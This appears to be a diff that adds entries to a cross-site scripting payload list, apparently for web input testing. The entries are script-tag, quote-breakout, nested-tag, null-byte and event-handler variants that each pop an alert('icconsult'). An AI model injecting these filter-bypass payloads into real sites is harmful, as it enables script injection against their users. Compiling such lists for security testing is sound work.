@@ -3,3 +3,34 @@
 \<script\>alert(\'iCConsult3\')\<\/script\>
 %5C%3Cscript%5C%3Ealert%28%5C%27icconsult%5C%27%29%5C%3C%5C/script%5C%3E
 &lt;script&gt;alert('icconsult')&lt;/script&gt;
+<scr ipt>alert('icconsult')</scr ipt>
+"><script>alert('icconsult')</script>
+"><script>alert('icconsult')</script><"
+'><script>alert('icconsult')</script>
+'><script>alert('icconsult')</script><'
+<SCRIPT>alert('icconsult');</SCRIPT>
+<scri<script>pt>alert('icconsult');</scr</script>ipt>
+<SCRI<script>PT>alert('icconsult');</SCR</script>IPT>
+<scri<scr<script>ipt>pt>alert('icconsult');</scr</sc</script>ript>ipt>
+";alert('icconsult');"
+';alert('icconsult');'
+;alert('icconsult');
+alert('icconsult');
+<SCR%00IPT>alert('icconsult')</SCR%00IPT>
+\";alert('icconsult');//
+<STYLE TYPE="text/javascript">alert('icconsult');</STYLE>
+<<SCRIPT>alert('icconsult')//<</SCRIPT>
+"{EVENTHANDLER}=alert('icconsult') 
+<<SCRIPT>alert('icconsult')//<</SCRIPT>
+<img src="1" onerror="alert('icconsult')">
+<img src='1' onerror='alert('icconsult')'
+onerror="alert('icconsult')"
+onerror='alert('icconsult')'
+onload="alert('icconsult')"
+onload='alert('icconsult')'
+<IMG """><SCRIPT>alert('icconsult')</SCRIPT>">
+<IMG '''><SCRIPT>alert('icconsult')</SCRIPT>'>
+"""><SCRIPT>alert('icconsult')
+'''><SCRIPT>alert('icconsult')'
+<IFRAME SRC='f' onerror="alert('icconsult')"></IFRAME>
+<IFRAME SRC='f' onerror='alert('icconsult')'></IFRAME>
